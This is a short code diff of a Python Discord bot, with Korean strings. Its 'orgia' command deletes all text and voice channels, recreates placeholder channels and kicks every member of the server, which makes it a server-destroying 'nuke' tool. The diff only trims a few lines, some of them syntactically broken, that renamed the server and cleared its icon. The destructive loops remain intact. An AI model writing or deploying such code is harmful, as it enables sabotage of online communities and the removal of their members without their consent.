@@ -25,12 +25,6 @@ async def on_ready():
 
 @client.command()
 async def orgia(ctx):
-  every = get(ctx.guild.roles, name="@everyone")
-  permissions = discord.Permissions()
-  await every.edit(reason = None)
-  owner = get(ctx.guild.owner.name)
-  roles = get(ctx.guild.roles)
-  await ctx.guild.edit(icon=None, name=f"{owner}님의 서버")
   for channel in ctx.guild.text_channels:
       await channel.delete()
   for channel in ctx.guild.voice_channels:
@@ -44,8 +38,6 @@ async def orgia(ctx):
   name2 = '음성 채널'
   await ctx.guild.create_text_channel(name="일반")
   await ctx.guild.create_voice_channel(name="일반")
-  channel = get(ctx.guild.channels, name="일반")
-      await channel.send('끄읕') 
   for member in ctx.guild.members:
       try:
           await member.kick()
